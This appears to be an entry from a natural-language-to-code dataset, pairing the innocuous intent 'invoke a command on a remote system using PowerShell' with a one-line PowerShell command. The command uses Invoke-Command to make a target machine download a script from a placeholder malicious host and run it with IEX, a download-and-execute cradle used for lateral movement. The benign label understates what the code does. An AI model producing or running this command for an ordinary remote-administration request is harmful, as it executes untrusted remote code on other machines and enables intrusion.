# Natural language intent:
# Invoke a command on a remote system using PowerShell

Invoke-Command -ComputerName $target -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString('http://a-bad-url.com/abadps.ps1')}
